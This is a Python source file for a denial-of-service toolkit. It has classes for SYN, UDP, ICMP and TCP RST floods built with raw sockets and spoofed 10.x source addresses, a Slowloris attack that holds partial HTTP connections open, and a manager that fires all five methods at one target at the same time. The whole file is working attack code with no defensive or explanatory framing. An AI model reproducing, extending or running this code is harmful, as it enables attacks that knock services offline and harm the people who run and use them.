import asyncio, socket, struct, random, time, os
from typing import Dict, List, Optional, Tuple

class SynFloodV5:
    def __init__(self):
        self.name = "SYN Flood V5"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        results = {"sent": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        port = 80
        if ":" in parsed:
            try:
                port = int(parsed.split(":")[1])
            except:
                pass

        async def syn_one(src_port: int):
            nonlocal results
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                # Build IP header
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                src_ip = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dst_ip = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
                    ip_frag_off, ip_ttl, ip_proto, ip_check, src_ip, dst_ip)
                # Build TCP header
                tcp_source = src_port
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                tcp_offset = 5
                tcp_reserved = 0
                tcp_flags = 0x02  # SYN
                tcp_window = socket.htons(65535)
                tcp_check = 0
                tcp_urg_ptr = 0
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    tcp_source, port, tcp_seq, tcp_ack_seq,
                    (tcp_offset << 4) + tcp_reserved, tcp_flags,
                    tcp_window, tcp_check, tcp_urg_ptr)
                # Pseudo header checksum
                ps_hdr = struct.pack("!4s4sBBH", src_ip, dst_ip, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cksum = self._checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    tcp_source, port, tcp_seq, tcp_ack_seq,
                    (tcp_offset << 4) + tcp_reserved, tcp_flags,
                    tcp_window, socket.htons(cksum), tcp_urg_ptr)
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        start = time.time()
        while time.time() - start < duration:
            tasks = [syn_one(random.randint(1024, 65535)) for _ in range(min(threads, 200))]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        results["sent"] = self.sent
        return results

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2 != 0:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

class UdpFloodV5:
    def __init__(self):
        self.name = "UDP Flood V5"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        results = {"sent": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        port = 80
        if ":" in parsed:
            try:
                port = int(parsed.split(":")[1])
            except:
                pass

        async def udp_one():
            nonlocal results
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(random.randint(64, 1400))
                sock.sendto(payload, (ip, port))
                self.sent += 1
                sock.close()
            except:
                pass

        start = time.time()
        while time.time() - start < duration:
            tasks = [udp_one() for _ in range(min(threads, 200))]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        results["sent"] = self.sent
        return results

class IcmpFloodV5:
    def __init__(self):
        self.name = "ICMP Flood V5"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        results = {"sent": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results

        async def icmp_one():
            nonlocal results
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                icmp_type = 8
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                payload = os.urandom(random.randint(40, 100))
                header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                cksum = self._checksum(header + payload)
                header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(cksum), icmp_id, icmp_seq)
                sock.sendto(header + payload, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        start = time.time()
        while time.time() - start < duration:
            tasks = [icmp_one() for _ in range(min(threads, 100))]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        results["sent"] = self.sent
        return results

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2 != 0:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

class TcpResetFlood:
    def __init__(self):
        self.name = "TCP RST Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        results = {"sent": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results

        async def rst_one(src_port: int):
            nonlocal results
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dst_ip = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    (4 << 4) + 5, 0, 40, random.randint(1, 65535),
                    0, 255, socket.IPPROTO_TCP, 0, src_ip, dst_ip)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, 80, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x14,  # RST + ACK
                    socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", src_ip, dst_ip, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = self._checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, 80, random.randint(0, 4294967295), 0,
                    (5 << 4) + 0, 0x14,
                    socket.htons(65535), socket.htons(cks), 0)
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                pass

        start = time.time()
        while time.time() - start < duration:
            tasks = [rst_one(random.randint(1024, 65535)) for _ in range(min(threads, 200))]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

        results["sent"] = self.sent
        return results

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2 != 0:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

class SlowLorisV5:
    def __init__(self):
        self.name = "Slowloris V5"
        self.active = 0

    async def attack(self, target: str, duration: int = 60, connections: int = 200) -> Dict:
        results = {"active_connections": 0, "error": ""}
        parsed = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(parsed.split(":")[0])
        except:
            results["error"] = "resolve failed"
            return results
        port = 443 if "https" in target else 80
        if ":" in parsed:
            try:
                port = int(parsed.split(":")[1])
            except:
                pass

        socks = []
        async def open_conn():
            nonlocal results
            try:
                reader, writer = await asyncio.open_connection(ip, port)
                # Send partial HTTP request
                writer.write(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\nHost: {parsed.split(':')[0]}\r\nUser-Agent: {random.choice(['Mozilla/5.0','Chrome/136','Safari/604.1'])}\r\n".encode())
                await writer.drain()
                socks.append(writer)
                self.active += 1
                return writer
            except:
                pass
            return None

        async def keep_alive(writer, end_time):
            nonlocal results
            while time.time() < end_time:
                try:
                    header = f"X-Keep-Alive: {random.randint(0,999999999)}\r\n"
                    writer.write(header.encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(5, 15))
                except:
                    break

        end = time.time() + duration
        # Open connections
        for _ in range(min(connections, 300)):
            w = await open_conn()
            await asyncio.sleep(0.01)

        results["active_connections"] = len(socks)
        # Maintain
        if socks:
            keep_tasks = [keep_alive(w, end) for w in socks]
            await asyncio.gather(*keep_tasks, return_exceptions=True)

        for w in socks:
            try:
                w.close()
            except:
                pass

        return results

class L4AttackManager:
    def __init__(self):
        self.methods = {
            "syn": SynFloodV5(),
            "udp": UdpFloodV5(),
            "icmp": IcmpFloodV5(),
            "rst": TcpResetFlood(),
            "slowloris": SlowLorisV5(),
        }

    async def launch_all(self, target: str, duration: int = 30) -> Dict:
        results = {}
        coros = []
        for name, method in self.methods.items():
            if name == "slowloris":
                coros.append((name, method.attack(target, duration=duration, connections=150)))
            else:
                coros.append((name, method.attack(target, duration=duration, threads=100)))
        for name, coro in coros:
            try:
                results[name] = await asyncio.wait_for(coro, timeout=duration + 10)
            except Exception as e:
                results[name] = {"error": str(e)}
        return results

    async def probe_all(self, target: str) -> Dict:
        results = {}
        for name in self.methods:
            results[name] = {"available": True, "note": "L4 raw socket method"}
        return results
